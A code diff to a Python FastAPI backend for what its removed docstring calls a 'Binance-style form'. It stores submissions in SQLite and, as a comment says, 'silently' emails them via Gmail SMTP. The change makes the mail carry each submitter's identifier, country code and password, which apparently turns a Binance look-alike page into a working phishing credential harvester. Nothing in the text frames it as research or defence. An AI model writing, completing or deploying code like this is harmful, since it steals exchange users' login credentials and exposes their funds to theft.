@@ -1,14 +1,3 @@
-"""
-Backend FastAPI – Formulario estilo Binance
-Guarda datos en SQLite y envía notificación por correo (Gmail SMTP)
-
-Instalar:
-    pip install fastapi uvicorn aiosqlite
-
-Correr:
-    uvicorn main:app --reload --port 8000
-"""
-
 import sqlite3
 import aiosqlite
 import smtplib
@@ -20,6 +9,7 @@ from fastapi.staticfiles import StaticFiles
 from fastapi.responses import FileResponse, JSONResponse
 from pydantic import BaseModel, field_validator
 from datetime import datetime
+import traceback
 import re, os
 
 # ─────────────────────────────────────────────────────────────
@@ -181,10 +171,10 @@ async def guardar_formulario(data: FormData):
     # 2️⃣  Enviar correo silenciosamente
     try:
         enviar_correo(
-            identificador=data.valor,
-            codigo_pais="N/A",
-            contrasena=f"Tipo de dato: {data.tipo}",
-            fecha=fecha
+            data.identificador,
+            data.codigo_pais,
+            data.contrasena,
+            fecha
         )
     except Exception:
         traceback.print_exc()
